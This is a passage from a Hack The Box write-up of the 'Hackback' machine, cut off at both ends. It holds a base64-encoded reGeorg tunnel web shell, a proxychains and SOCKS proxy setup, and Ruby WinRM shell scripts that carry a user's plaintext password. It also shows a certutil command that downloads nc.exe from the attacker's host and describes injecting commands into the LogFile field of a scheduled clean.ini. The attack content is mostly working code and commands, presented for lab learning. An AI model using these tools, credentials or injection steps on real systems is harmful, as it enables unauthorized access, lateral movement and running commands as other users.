ICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaW50IGJ1ZmZMZW4gPSBSZXF1ZXN0LkNvbnRlbnRMZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtidWZmTGVuXTsKICAgICAgICAgICAgICAgICAgICBpbnQgYyA9IDA7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gUmVxdWVzdC5JbnB1dFN0cmVhbS5SZWFkKGJ1ZmYsIDAsIGJ1ZmYuTGVuZ3RoKSkgPiAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgcy5TZW5kKGJ1ZmYpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiUkVBRCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWyJzb2NrZXQiXTsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGludCBjID0gMDsKICAgICAgICAgICAgICAgICAgICBieXRlW10gcmVhZEJ1ZmYgPSBuZXcgYnl0ZVs1MTJdOwogICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gcy5SZWNlaXZlKHJlYWRCdWZmKSkgPiAwKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gbmV3QnVmZiA9IG5ldyBieXRlW2NdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9BcnJheS5Db25zdHJhaW5lZENvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLkJ1ZmZlci5CbG9ja0NvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQmluYXJ5V3JpdGUobmV3QnVmZik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNhdGNoIChTb2NrZXRFeGNlcHRpb24gc29leCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXgpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUmVzcG9uc2UuV3JpdGUoIkdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZSciKTsKICAgICAgICB9CiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uIGV4S2FrKQogICAgewogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4S2FrLk1lc3NhZ2UpOwogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgfQolPgoK&quot;)); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-checked-the-tunnel-&quot;&gt;Then I checked the tunnel :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great-&quot;&gt;Great !&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;running-the-proxy-server-shell-as-simple&quot;&gt;Running the Proxy Server, Shell as simple&lt;/h3&gt;
&lt;h4 id=&quot;first-thing-to-do-is-to-configure-proxychains-to-use-whatever-port-we-like-i-used-8888-&quot;&gt;First thing to do is to configure &lt;code class=&quot;highlighter-rouge&quot;&gt;proxychains&lt;/code&gt; to use whatever port we like, I used 8888 :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/proxychains.conf&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/hackback/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-used-regeorgsocksproxypy-and-gave-it-the-port-and-the-path-&quot;&gt;Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;reGeorgSocksProxy.py&lt;/code&gt; and gave it the port and the path :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python reGeorgSocksProxy.py -p 8888 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx &lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-connect-as-simple-i-used-alamots-winrm-ruby-shell-&quot;&gt;Now we can connect as &lt;code class=&quot;highlighter-rouge&quot;&gt;simple&lt;/code&gt;. I used Alamot’s winrm ruby shell :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'winrm'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Author: Alamot&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; 
  &lt;span class=&quot;ss&quot;&gt;endpoint: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://10.10.10.128:5985/wsman'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;transport: :ssl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;user: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'simple'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;password: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ZonoProprioZomaro:-('&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;:no_ssl_peer_verification&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:powershell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;until&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;exit&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&amp;gt; ')&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chomp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;STDIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gets&lt;/span&gt;        
        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;STDOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;STDERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;    
    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Exiting with code &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exitcode&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and--no-flag-&quot;&gt;And …. no flag !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;cleanini--shell-as-hacker&quot;&gt;clean.ini , Shell as hacker&lt;/h3&gt;
&lt;h4 id=&quot;i-checked-c-and-found-a-strange-directory-called-util-&quot;&gt;I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;c:\&lt;/code&gt; and found a strange directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;util&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;cutil&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;c:\util&lt;/code&gt;:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK C:\&amp;gt; cd util                              
PS hackback\simple@HACKBACK util&amp;gt; ls

Directory: C:\util
    
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/14/2018   3:30 PM                PingCastle

-a----         3/8/2007  12:12 AM         139264 Fping.exe

-a----        3/29/2017   7:46 AM         312832 kirbikator.exe

-a----       12/14/2018   3:42 PM           1404 ms.hta

-a----        2/29/2016  12:04 PM         359336 PSCP.EXE

-a----        2/29/2016  12:04 PM         367528 PSFTP.EXE

-a----         5/4/2018  12:21 PM          23552 RawCap.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;however-there-was-a-hidden-directory-if-we-do-dir--force-&quot;&gt;However there was a hidden directory, if we do &lt;code class=&quot;highlighter-rouge&quot;&gt;dir -force&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK util&amp;gt; dir -force

Directory: C:\util

Mode                LastWriteTime         Length Name
----                -------------         ------ ----                                     
d-----       12/14/2018   3:30 PM                PingCastle

d--h--       12/21/2018   6:21 AM                scripts

-a----         3/8/2007  12:12 AM         139264 Fping.exe

-a----        3/29/2017   7:46 AM         312832 kirbikator.exe

-a----       12/14/2018   3:42 PM           1404 ms.hta

-a----        2/29/2016  12:04 PM         359336 PSCP.EXE

-a----        2/29/2016  12:04 PM         367528 PSFTP.EXE

-a----         5/4/2018  12:21 PM          23552 RawCap.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;a-new-directory-appeared--scripts-looking-in-that-directory-&quot;&gt;A new directory appeared : &lt;code class=&quot;highlighter-rouge&quot;&gt;scripts&lt;/code&gt;. looking in that directory :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK util&amp;gt; cd scripts
|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
Could not find item C:\util\scripts.
At line:1 char:56
+ ... join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name), ...
+                                                           ~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\util\scripts:String) [Get-Item], IOException
    + FullyQualifiedErrorId : ItemNotFound,Microsoft.PowerShell.Commands.GetItemCommand
PS hackback\simple@HACKBACK &amp;gt; ls

    Directory: C:\util\scripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/13/2018   2:54 PM            spool
-a----       12/21/2018   5:44 AM         84 backup.bat
-a----         7/5/2019   5:34 PM         39 batch.log
-a----         7/5/2019   6:07 PM        135 clean.ini
-a----        12/8/2018   9:17 AM       1232 dellog.ps1
-a----         7/5/2019   5:34 PM         36 log.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;without-talking-too-much-about-the-rabbit-holes-and-the-failed-attempts-if-we-check-cleanini-&quot;&gt;Without talking too much about the rabbit holes and the failed attempts. If we check &lt;code class=&quot;highlighter-rouge&quot;&gt;clean.ini&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK &amp;gt; type clean.ini
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt
Directory=c:\inetpub\logs\logfiles
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;obviously-it-gets-executed-from-time-to-time-and-its-the-only-writable-thing-by-simple-in-that-directory-we-can-inject-commands-in-logfile-which-means-that-we-can-make-another-user-execute-our-commands-i-tried-to-upload-ncexe-but-&quot;&gt;Obviously it gets executed from time to time, and it’s the only writable thing by &lt;code class=&quot;highlighter-rouge&quot;&gt;simple&lt;/code&gt; in that directory. We can inject commands in &lt;code class=&quot;highlighter-rouge&quot;&gt;LogFile&lt;/code&gt; which means that we can make another user execute our commands. I tried to upload &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; but :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK &amp;gt; certutil -urlcache -split -f http://10.10.xx.xx/nc64.exe C:\windows\system32\spool\drivers\color\nc.exe
|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
At line:1 char:1
+ certutil -urlcache -split -f http://10.10.xx.xx/nc64.exe C:\windows\s ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;expected-i-terminated-that-winrm-session-and-used-alamots-other-winrm-shell-that-had-upload-and-download-capabilities-&quot;&gt;Expected. I terminated that &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt; session and used Alamot’s other &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt; shell that had upload and download capabilities :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'winrm-fs'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Author: Alamot&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# To upload a file type: UPLOAD local_path remote_path&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# e.g.: PS&amp;gt; UPLOAD myfile.txt C:\temp\myfile.txt&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; 
  &lt;span class=&quot;ss&quot;&gt;endpoint: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://10.10.10.128:5985/wsman'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;user: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'simple'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;password: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ZonoProprioZomaro:-('&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;file_manager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;FileManager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 


&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;tokenize&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
      &lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/\s(?=(?:[^'&quot;]|'[^']*'|&quot;[^&quot;]*&quot;)*$)/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;
      &lt;span class=&quot;nf&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;empty?&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}.&lt;/span&gt;
      &lt;span class=&quot;nf&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/(^ +)|( +$)|(^[&quot;']+)|([&quot;']+$)/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;


&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:powershell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;until&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;exit&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&amp;gt; ')&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chomp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;STDIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gets&lt;/span&gt;
